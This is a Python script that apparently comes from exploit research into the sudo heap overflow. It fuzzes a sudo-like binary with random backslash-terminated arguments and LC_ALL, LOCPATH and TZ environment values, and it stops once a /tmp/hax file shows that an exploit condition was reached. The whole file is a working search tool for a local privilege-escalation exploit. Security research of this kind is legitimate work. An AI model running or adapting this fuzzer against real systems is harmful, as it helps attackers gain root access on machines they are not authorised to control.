import json
import subprocess
import sys
import os
import random

NEXT = "22223333"
#LIBRARY = "00001111"
#KNOWN = "AAAABBBB"
NAME = "XXXX/liveoverflow"

# taken from fengshui
_SIZES = [i for i in range(0,0x1ff)]
ALPHABET = '0123456789ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'


def run_sudo_check_hax(arg):
    # remember the file
    with open('/tmp/args','w') as f:
        f.write(json.dumps(arg))

    args = ["/pwd/sudoenv2"] + arg
    #os.execv("/pwd/sudoenv2", args)
    p = subprocess.Popen(args, bufsize=0,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    try:
        lines = p.communicate(b"quit\nquit\nquit\nquit\n",timeout=1)
        #print(lines[0].decode('utf-8'))
    except subprocess.TimeoutExpired:
        p.terminate()
        pass
    #print('hax exist?')
    if os.path.isfile('/tmp/hax'):
        print("FOUND EXPLOIT CONDITION")
        print(arg)
        exit()

while True:
    ARGV_1 = random.choice(ALPHABET)*random.choice(_SIZES)
    ENV_KEY = random.choice(ALPHABET)*random.choice(_SIZES)
    ENV_VAR = random.choice(ALPHABET)*random.choice(_SIZES)
    LC_ALL = random.choice(ALPHABET)*random.choice(_SIZES)
    LOCPATH = random.choice(ALPHABET)*random.choice(_SIZES)
    TZ = random.choice(ALPHABET)*random.choice(_SIZES)

    arg = [
        # used for argv[1]: -s AAAAAA\ 
        ARGV_1+"\\",
        # used as env[]
        ENV_KEY+"="+ENV_VAR+
        "\\","\\","\\","\\","\\","\\","\\","\\", # LIBRARY
        "\\","\\","\\","\\","\\","\\","\\","\\", # KNOWN
        NAME,
    ]

    if random.randint(0,5):
        arg += ["LC_ALL="+LC_ALL]
    if random.randint(0,5):
        arg += ["LOCPATH="+LOCPATH]
    if random.randint(0,5):
        arg += ["TZ="+TZ]

    run_sudo_check_hax(arg)